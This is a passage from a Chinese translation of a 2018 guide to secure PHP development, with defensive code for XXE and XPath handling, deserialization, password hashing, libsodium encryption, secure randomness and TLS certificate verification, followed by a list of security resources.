攻击可用作包含攻击代码的本地/远程文件的启动器。</p><p>早期版本的 Google Docs 被着名于 XXE ，但除了在很大程度上使用 XML 的商业应用程序之外，基本闻所未闻。</p><p>针对 XXE 袭击的主要缓解措施:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>除 XML 文档外，<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXPATH_Injection" target="_blank" rel="noopener">XPath注入</a>与 SQL 注入非常相似。</p><p>幸运的是，将用户输入传递给 XPath 查询的情况在 PHP 生态中非常罕见。</p><p>而不幸的是，这也意味着 PHP 生态中不存在可用的最佳避免措施（预编译和参数化 XPath 查询）。最好的办法是在任何涉及 XPath 查询的数据上设置允许使用的字符白名单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeXPathEscaper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">allowAlphaNumeric</span><span class="params">(string $input)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> \preg_replace(<span class="string">'#[^A-Za-z0-9]#'</span>, <span class="string">''</span>, $input);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $input</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">allowNumeric</span><span class="params">(string $input)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> \preg_replace(<span class="string">'#[^0-9]#'</span>, <span class="string">''</span>, $input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line">$selected = $xml-&gt;xpath(</span><br><span class="line">    <span class="string">"/user/username/"</span> . SafeXPathEscaper::allowAlphaNumeric(</span><br><span class="line">        $_GET[<span class="string">'username'</span>]</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>白名单总会比黑名单更安全。</p><h3 id="反序列化和-PHP-对象注入"><a href="#反序列化和-PHP-对象注入" class="headerlink" title="反序列化和 PHP 对象注入"></a>反序列化和 PHP 对象注入</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F04%2Fsecurely-implementing-de-serialization-in-php" target="_blank" rel="noopener">在PHP中安全地实现（反）序列化</a></p></blockquote><p>如果你将不可信的数据传递给<code>unserialize()</code>，则通常是这两个结果之一：</p><ul><li>PHP 对象注入，它能用于启动 POP 链（POP chain）并触发其他误用对象的漏洞。</li><li>PHP 解释器本身的内存损坏。</li></ul><p>大多数开发人员更喜欢使用JSON序列化，这是对其软件安全状况的显著改进。但请记住，<a href="https://link.juejin.im/?target=http%3A%2F%2Flukasmartinelli.ch%2Fweb%2F2014%2F11%2F17%2Fphp-dos-attack-revisited.html" target="_blank" rel="noopener"><code>json_decode()</code>容易受到散列冲突拒绝服务（Hash-DoS）攻击</a>。不幸的是，<a href="https://link.juejin.im/?target=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D70644" target="_blank" rel="noopener">PHP的Hash-DOS问题还没有得到彻底解决</a>。</p><p>从<code>djb33</code>迁移到<code>Siphash</code>，对于字符串输入，哈希输出的最高位设置为 1 ，对于整数输入设置为 0 ，使用<code>CSPRNG</code>提供的请求密钥，将完全解决这些攻击。</p><p>不幸的是， PHP 团队还没有准备好放弃他们已经在 PHP 7 系列中取得的性能提升，所以很难说服他们放弃 djb33 （这是非常快但不安全的） 赞成 SipHash （这也是快速的，但不像 djb33 那么快，但更安全）。 如果性能受到重大影响，可能会阻碍未来版本的采用，但也影响了安全性。</p><p>因此，最好的办法是：</p><ul><li><p>使用<code>JSON</code>，因为它比<code>unserialize()</code>更安全。</p></li><li><p>在任何可能的地方，确保输入在反序列化之前被认证。</p><ul><li><p>对于提供给用户的数据，通过一个只有服务器知道的秘钥使用<code>sodium_crypto_auth()</code>和<code>sodium_crypto_auth_verify()</code>验证。</p></li><li><p>对于第三方提供的数据，让他们使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sodium_crypto_sign()</span><br></pre></td></tr></table></figure><p>签名他们的 JSON 消息，然后使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sodium_crypto_sign_open()</span><br></pre></td></tr></table></figure><p>和第三方公钥验证消息。</p><ul><li>如果你需要对传输的签名进行十六进制或 Base64 位编码，也可以使用分离的签名 API 。</li></ul></li></ul></li><li><p>如果你无法验证 JSON 字符串，请严格限制速度并阻止 IP 地址，以减轻重复的违规者。</p></li></ul><h3 id="密码散列"><a href="#密码散列" class="headerlink" title="密码散列"></a>密码散列</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F02%2Fhow-safely-store-password-in-2016" target="_blank" rel="noopener">2016 年，如何安全地保存用户密码</a></p></blockquote><p>安全的密码存储曾经是一个激烈争论的话题，但现在实现起来相当微不足道，特别是在 PHP 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hash = \password_hash($password, PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (\password_verify($password, $hash)) &#123;</span><br><span class="line">    <span class="comment">// Authenticated.</span></span><br><span class="line">    <span class="keyword">if</span> (\password_needs_rehash($hash, PASSWORD_DEFAULT)) &#123;</span><br><span class="line">        <span class="comment">// Rehash, update database.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你甚至不需要知道在后台使用什么算法，因为如果你使用最新版本的 PHP ，你也将使用当前最新的技术，用户的密码将会自动进行升级（只要有新的默认算法可用）。</p><p>无论你做什么，都<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F08%2Fon-insecurity-popular-open-source-php-cms-platforms%23wordpress-password-storage" target="_blank" rel="noopener">不要做 WordPress 所做的事情</a>。</p><p>从 PHP 5.5 到 7.2 ，默认算法都是 Bcrypt 。在未来，它可能会切换到获得<a href="https://link.juejin.im/?target=https%3A%2F%2Fpassword-hashing.net%2F" target="_blank" rel="noopener">密码哈希大赛冠军</a>的 Argon2 。</p><p>如果你以前没有使用<code>password_*</code> API ，那需要迁移遗留哈希，请确保<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F02%2Fhow-safely-store-password-in-2016%23legacy-hashes" target="_blank" rel="noopener">以这种方式进行</a>。很多公司搞错了， 最有名的是<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.theregister.co.uk%2F2016%2F12%2F15%2Fyahoos_password_hash%2F" target="_blank" rel="noopener">雅虎</a>。 最近，错误地实施传统哈希升级似乎导致了<a href="https://link.juejin.im/?target=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x24.html" target="_blank" rel="noopener">苹果的iamroot错误</a>。</p><h3 id="通用加密"><a href="#通用加密" class="headerlink" title="通用加密"></a>通用加密</h3><p>这是一些我们详细写了的话题：</p><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F05%2Fusing-encryption-and-authentication-correctly" target="_blank" rel="noopener">Using Encryption and Authentication Correctly</a> (2015)</li><li>Recommended: <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F11%2Fchoosing-right-cryptography-library-for-your-php-project-guide" target="_blank" rel="noopener">Choosing the Right Cryptography Library for your PHP Project: A Guide</a> (2015)</li><li>Recommended: <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F08%2Fyou-wouldnt-base64-a-password-cryptography-decoded" target="_blank" rel="noopener">You Wouldn’t Base64 a Password - Cryptography Decoded</a> (2015)</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F02%2Fcryptographically-secure-php-development" target="_blank" rel="noopener">Cryptographically Secure PHP Development</a> (2017)</li><li>Recommended: <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F06%2Flibsodium-quick-reference-quick-comparison-similar-functions-and-which-one-use" target="_blank" rel="noopener">Libsodium Quick Reference: Similarly-Named Functions and Their Use-Cases</a> (2017)</li></ul><p>一般来说，你总是希望使用 Sodium cryptography library（libsodium）进行应用层加密。如果你需要支持早于 7.2 的 PHP 版本（像 5.2.4），你可以使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsodium_compat" target="_blank" rel="noopener">sodium_compat</a>，基本上可以假设你的用户也是 7.2 。</p><p>在特定情况下，由于严格的算法选择和互操作性，你可能需要不同的库。如有疑问，请咨询密码专家和密码工程师，了解密码选择是否安全（<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fservices" target="_blank" rel="noopener">这是我们提供的服务之一</a>）。</p><h3 id="随机性"><a href="#随机性" class="headerlink" title="随机性"></a>随机性</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F07%2Fhow-safely-generate-random-strings-and-integers-in-php" target="_blank" rel="noopener">如何在 PHP 中生成安全的整数和字符串？</a></p></blockquote><p>如果你需要随机数字，请使用<code>random_int()</code>。如果你需要随机字节字符串，请使用<code>random_bytes()</code>。不要使用<code>mt_rand()</code>，<code>rand()</code>或<code>uniqid()</code>。</p><p>如果你需要从秘密种子（secret seed）生成伪随机数（pseudorandom），请使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fseedspring" target="_blank" rel="noopener">SeedSpring</a>，而不是<code>srand()</code>或<code>mt_srand()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">ParagonIE</span>\<span class="title">SeedSpring</span>\<span class="title">SeedSpring</span>;</span><br><span class="line"></span><br><span class="line">$seed = random_bytes(<span class="number">16</span>);</span><br><span class="line">$rng = <span class="keyword">new</span> SeedSpring($seed);</span><br><span class="line"></span><br><span class="line">$data = $rng-&gt;getBytes(<span class="number">1024</span>);</span><br><span class="line">$int = $rng-&gt;getInt(<span class="number">1</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h3 id="服务器端-HTTPS-请求"><a href="#服务器端-HTTPS-请求" class="headerlink" title="服务器端 HTTPS 请求"></a>服务器端 HTTPS 请求</h3><blockquote><p>确保 TLS 证书验证没有被禁用</p></blockquote><p>随意使用你已经熟悉的任何兼容 PSR-7 的 HTTP 客户端。 我们喜欢 Guzzle ，有些人喜欢直接使用 cURL 。</p><p>无论你最终使用什么，请确保使用的确定性，以<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F10%2Fcertainty-automated-cacert-pem-management-for-php-software" target="_blank" rel="noopener">确保始终可以拥有最新的 CACert 软件包</a>，从而允许启用最严格的 TLS 证书验证设置并保护服务器的出站 HTTPS 请求。</p><p>安装 Certainty 很简单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> paragonie/certainty:^<span class="number">1</span></span><br></pre></td></tr></table></figure><p>使用 Certainty 也很简单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">ParagonIE</span>\<span class="title">Certainty</span>\<span class="title">RemoteFetch</span>;</span><br><span class="line"></span><br><span class="line">    $latestCACertBundle = (<span class="keyword">new</span> RemoteFetch())-&gt;getLatestBundle();</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cURL users:</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_CAINFO, $latestCACertBundle-&gt;getFilePath());</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Guzzle users:</span></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> \GuzzleHttp\Client $http */</span></span><br><span class="line">    $repsonse = $http-&gt;get(</span><br><span class="line">        <span class="string">'https://example.com'</span>, </span><br><span class="line">        [</span><br><span class="line">            <span class="string">'verify'</span> =&gt; $latestCACertBundle-&gt;getFilePath()</span><br><span class="line">        ]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>这样可以保护你免受网络服务器与集成的任何第三方 API 之间的中间人攻击。</p><p><strong>我们真的需要 Certainty 吗？</strong></p><p>保护你的系统， Certainty 并不是严格的要求。缺少它并不是什么漏洞。但如果没有 Certainty ，开源软件必须猜测操作系统的 CACert 软件包的存在位置，如果猜测错误，它往往会失败并导致可用性问题。从历史上看，这激励了许多开发人员只是禁用证书验证，以便他们的代码“正常工作”，却没有意识到他们只是将应用程序变成主动攻击。 Certainty 通过将 CACert 捆绑在最新的可预测位置来消除这种激励。 Certainty 还为希望<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fcertainty%2Fblob%2Fmaster%2Fdocs%2Ffeatures%2FLocalCACertBuilder.md" target="_blank" rel="noopener">运行自己的内部 CA </a>为企业提供大量的工具。</p><p><strong>谁禁用了证书验证？</strong></p><p>流行的内容管理系统（WordPress，Magento 等 CMS）的插件/扩展开发者！这是我们试图在生态系统层面上解决的一个巨大的问题。 它不是孤立的任何特定的 CMS ，你会发现这些不安全的插件等都是类似的。</p><p>如果使用了类似的 CMS ，请在插件中搜索<code>CURLOPT_SSL_VERIFYPEER</code>和<code>CURLOPT_SSL_VERIFYHOST</code>，你可能会发现有几个将这些值设置为<code>FALSE</code>。</p><h3 id="避免的事情"><a href="#避免的事情" class="headerlink" title="避免的事情"></a>避免的事情</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F05%2Fif-you-re-typing-word-mcrypt-into-your-code-you-re-doing-it-wrong" target="_blank" rel="noopener">不要使用<code>mcrypt</code></a>。这是一个十多年来没有开发出来的密码学库。如果你遵循我们的 PHP 版本建议，这应该是一个容易避免的错误，因为<code>mcrypt</code>不再被 PHP 7.2 和更新的版本支持。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F01%2Fconfiguration-driven-php-security-advice-considered-harmful" target="_blank" rel="noopener">配置驱动的安全建议</a>应该大部分地忽略。如果你正在阅读 PHP 安全性指南，并告诉你更改 php.ini 设置而不是编写更好的代码，那么你可能正在阅读过时的建议。关闭窗口并转到一些和<code>register_globals</code>无关的文章上吧。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F03%2Fjwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid" target="_blank" rel="noopener">不要使用 JOSE（JWT，JWS，JWE）</a>，这是一套互联网标准，它编纂了一系列容易出错的密码设计。尽管由于某种原因，被写入了标准，也吸引了很多传道人。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2015%2F09%2Fcomprehensive-guide-url-parameter-encryption-in-php" target="_blank" rel="noopener">加密 URL 参数</a>是公司常用来模糊元数据的反模式（例如，我们有多少用户？）。 它带来了实施错误的高风险，也造成了错误的安全感。我们在链接的文章中提出了一个更安全的选择。</li><li>除非迫不得已，否则<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F09%2Funtangling-forget-me-knot-secure-account-recovery-made-simple" target="_blank" rel="noopener">不要提供“我忘记了我的密码”的功能</a>。 不要讳言：密码重置功能是一个后门。 有一些方法可以实施以抵御合理的威胁模型，但高风险用户应该不被考虑。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2016%2F12%2Feverything-you-know-about-public-key-encryption-in-php-is-wrong" target="_blank" rel="noopener">避免使用 RSA</a>，改用 libsodium 。如果你必须使用 RSA ，请确保指定 OAEP 填充。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> openssl_private_decrypt(</span><br><span class="line">    $ciphertext,</span><br><span class="line">    $decrypted, <span class="comment">// Plaintext gets written to this variable upon success,</span></span><br><span class="line">    $privateKey,</span><br><span class="line">    OPENSSL_PKCS1_OAEP_PADDING <span class="comment">// Important: DO NOT OMIT THIS!</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果你不得不使用 PKCS＃1 v1.5 填充，那么无论你与哪个集成在一起，几乎肯定会受到 <a href="https://link.juejin.im/?target=https%3A%2F%2Frobotattack.org%2F" target="_blank" rel="noopener">ROBOT</a> 的影响，请以允许明文泄露和签名伪造的漏洞将其报告给相应的供应商（或 US-CERT ）。</p><h2 id="专业用法"><a href="#专业用法" class="headerlink" title="专业用法"></a>专业用法</h2><p>现在你已经掌握了在 2018 年及以后构建安全 PHP 应用程序的基础知识，接下来我们来看一些更专业的用法。</p><h3 id="可搜索的加密"><a href="#可搜索的加密" class="headerlink" title="可搜索的加密"></a>可搜索的加密</h3><blockquote><p>深入：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F05%2Fbuilding-searchable-encrypted-databases-with-php-and-sql" target="_blank" rel="noopener">使用PHP和SQL构建可搜索的加密数据库</a></p></blockquote><p>可搜索的加密数据库是可取的，但被广泛认为是不太可能实现的。上面链接的博客文章试图通过改进我们解决方案来实现，但本质上是这样的：</p><ul><li>设计你的架构，以便数据库（database compromise）不会让攻击者访问你的加密密钥。</li><li>用一个密钥加密数据。</li><li>基于 HMAC 或具有静态盐的安全 KDF （secure KDF with a static salt）创建多个索引（具有自己独特的密钥）</li><li>可选：截断步骤3的输出，将其用作布隆过滤器（Bloom filter）</li><li>在 SELECT 查询中使用步骤3或4的输出</li><li>解密结果。</li></ul><p>在这个过程中的任何一步，你都可以根据实际使用情况进行不同的权衡。</p><h3 id="没有-Side-Channels-的基于令牌的身份验证"><a href="#没有-Side-Channels-的基于令牌的身份验证" class="headerlink" title="没有 Side-Channels 的基于令牌的身份验证"></a>没有 Side-Channels 的基于令牌的身份验证</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F02%2Fsplit-tokens-token-based-authentication-protocols-without-side-channels" target="_blank" rel="noopener">Split Tokens: Token-Based Authentication Protocols without Side-Channels</a></p></blockquote><p>说到数据库（上一节），你是否知道 SELECT 查询理论上可能是定时信息泄漏的来源？</p><p>简单的缓解措施：</p><ul><li>把你的认证令牌分为两半</li><li>一半在 SELECT 查询中使用</li><li>后一半在恒定的时间（constant-time）验证<ul><li>可以选择将后半部分的散列存储在数据库中。这对于只能使用一次的令牌是有意义的，例如 密码重置或“在此计算机上记住我”的令牌</li></ul></li></ul><p>即使可以使用定时泄漏来窃取一半的令牌，剩下的也需要暴力破解才能成功。</p><h3 id="开发安全的API"><a href="#开发安全的API" class="headerlink" title="开发安全的API"></a>开发安全的API</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F06%2Fhardening-your-php-powered-apis-with-sapient" target="_blank" rel="noopener">Hardening Your PHP-Powered APIs with Sapient</a></p></blockquote><p>我们写了 <a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient" target="_blank" rel="noopener">SAPIENT</a> （the <strong>S</strong>ecure <strong>API</strong> <strong>EN</strong>gineering <strong>T</strong>oolkit），让服务器到服务器验证的消息传递变得简单易行。除了 HTTPS 提供的安全性之外，<code>Sapient</code>允许你使用共享密钥或公钥来加密和验证消息。 这使得即使存在中间攻击者，并设有流氓证书颁发机构，你也可以使用<code>Ed25519</code>对 API 请求和响应进行身份验证，或者将消息加密到只能由接收方服务器的密钥解密的目标服务器。 由于每个 HTTP 消息体都通过安全密码进行身份验证，所以可以安全地使用它来代替<code>stateful token juggling protocols</code>（例如 OAuth）。但是，在密码学方面，在做任何不规范的事情之前，总要确保他们的实现是由专家研究的。</p><p>所有<code>Sapient</code>使用的密码算法都由<code>Sodium cryptography library</code>提供。</p><p>进一步阅读：</p><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient%2Ftree%2Fmaster%2Fdocs" target="_blank" rel="noopener">Sapient Documentation</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient%2Fblob%2Fmaster%2Fdocs%2FTutorial.md" target="_blank" rel="noopener">Sapient Tutorial</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fsapient%2Fblob%2Fmaster%2Fdocs%2FSpecification.md" target="_blank" rel="noopener">Sapient Specification</a></li></ul><p><code>Paragon Initiative Enterprises</code>已经在其许多产品（包括许多开源软件项目）中使用了<code>Sapient</code>， 并将继续添加软件项目到<code>Sapient</code>用户群中。</p><h3 id="使用Chronicle记录安全事件"><a href="#使用Chronicle记录安全事件" class="headerlink" title="使用Chronicle记录安全事件"></a>使用Chronicle记录安全事件</h3><blockquote><p>深入： <a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F07%2Fchronicle-will-make-you-question-need-for-blockchain-technology" target="_blank" rel="noopener">Chronicle Will Make You Question the Need for Blockchain Technology</a></p></blockquote><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fchronicle" target="_blank" rel="noopener">Chronicle</a>是一个基于散列链数据结构的仅追加密码分类账（append-only cryptographic ledger），具有很多吸引公司“区块链”技术的属性，而不会过分矫枉过正。</p><p>除了仅追加密码分类账（append-only cryptographic ledger）这个具有创造性的用例之外，<code>Chronicle</code>集成到SIEM中时，也可以十分有亮点，因为你可以将安全关键事件发送到私人<code>Chronicle</code>中，并且它们是不能被改变的。</p><p>如果你的<code>Chronicle</code>设置为将其摘要散列交叉签名到其他<code>Chronicle</code>实例，或者如果有其他实例配置为复制你的<code>Chronicle</code>内容，攻击者就很难篡改你的安全事件日志。</p><p>在<code>Chronicle</code>的帮助下，你可以获得区块链所承诺的弹性特性（resilience），而没有任何隐私，性能或可伸缩性问题。</p><p>要将数据发布到本地<code>Chronicle</code>，你可以使用任何与<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F12%2F2018-guide-building-secure-php-software%23secure-api-sapient" target="_blank" rel="noopener">Sapient-compatible API</a>，但最简单的解决方案称为<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fparagonie%2Fquill" target="_blank" rel="noopener">Quill</a>。</p><h2 id="作者的一些话"><a href="#作者的一些话" class="headerlink" title="作者的一些话"></a>作者的一些话</h2><p>一些聪明的读者可能注意到我们引用了很多我们自己的工作，包括博客文章和开源软件。（当然也不仅仅引用了我们自己的工作）</p><p>这绝不是偶然的。</p><p>自从我们在 2015 年初成立以来，一直在编写安全库并参与提高 PHP 生态系统安全性的工作。我们已经涉足了很多领域，而且我们的安全工程师（他们最近推动了更安全的加密技术加入 PHP 核心，就在最近的 PHP 7.2 中）自我担保地说，并不擅长自我炒作，或是对已经做过的工作持续热情。但你很可能没有听说我们多年来开发的工具或库。对于这个，深感抱歉。</p><p>不论如何，我们也不可能成为各方面的先行者，所以我们尽可能地选择与重视公共利益而不是贪图小利的行业专家工作。 这也是为什么浏览器安全的许多章节都参考了 <a href="https://link.juejin.im/?target=https%3A%2F%2Fscotthelme.co.uk%2F" target="_blank" rel="noopener">Scott Helme</a> 和他公司的工作，他们在为开发人员提供这些新的安全功能方面具有可访问性和可理解性。</p><p>本指南当然不会是详尽的。编写不安全代码的方法几乎和编写代码的方法一样多。 <strong>安全是一种心态，而不是目的地。</strong> 随着上面所写的一切，以及后面涉及的资源，我们希望这将有助于全世界的开发人员，从今天开始用 PHP 编写安全的软件。</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>如果你已经按照本页上的所有内容进行了操作，并且需要更多内容，则可能会对我们策划的阅读列表感兴趣，以便学习应用程序安全性。</p><p>如果你认为自己编写的代码足够安全，并希望我们从安全工程师的角度对其进行评判，这也是我们为客户提供的服务。</p><p>你如果为一家要进行合规性测试（PCI-DSS，ISO 27001等）的公司工作，可能还想聘请我们公司来审核你的源代码。我们的流程比其他安全咨询公司更适合开发者。</p><p>接下来是 PHP 和信息安全社区提供的资源列表，这些资源帮助互联网更加安全。</p><ul><li><a href="https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F" target="_blank" rel="noopener">PHP: The Right Way</a>：现代 PHP 开发的实用指南，免费在线。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmozilla.github.io%2Fserver-side-tls%2Fssl-config-generator%2F" target="_blank" rel="noopener">Mozilla’s SSL Config Generator</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fletsencrypt.org%2F" target="_blank" rel="noopener">Let’s Encrypt</a>：证书颁发机构，通过提供免费 TLS 证书，为创建更安全的 Internet 做了很多。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ssllabs.com%2Fssltest" target="_blank" rel="noopener">Qualys SSL Labs</a>：为 TLS 配置提供了一个快速而简单的测试套件。几乎每个人都使用这个来解决他们的密码组和证书问题，理由很充分：<strong>It does its job well.</strong></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsecurityheaders.io%2F" target="_blank" rel="noopener">Security Headers</a>：可以检验你的网站在使用浏览器安全功能来保护用户方面的表现如何。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Freport-uri.com%2F" target="_blank" rel="noopener">Report-URI</a>：一个很好的免费资源，提供监控 CSP/HPKP 等安全策略的实时安全报告服务。他们给你一个 Report-URI，你可以传递给你的用户的浏览器，如果有什么事情发生或有人发现 XSS 攻击媒介，他们会投诉Report-URI。 Report-URI 会汇总这些错误，并允许你更好地对这些报告进行疑难解答和分类。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ripstech.com%2Fphp-security-calendar-2017" target="_blank" rel="noopener">PHP Security Advent Calenda</a>：<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.ripstech.com%2F" target="_blank" rel="noopener">RIPSTech</a>旗下的团队负责。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsnuffleupagus.readthedocs.io%2F" target="_blank" rel="noopener">Snuffleupagus</a>：一个面向安全的 PHP 模块（<a 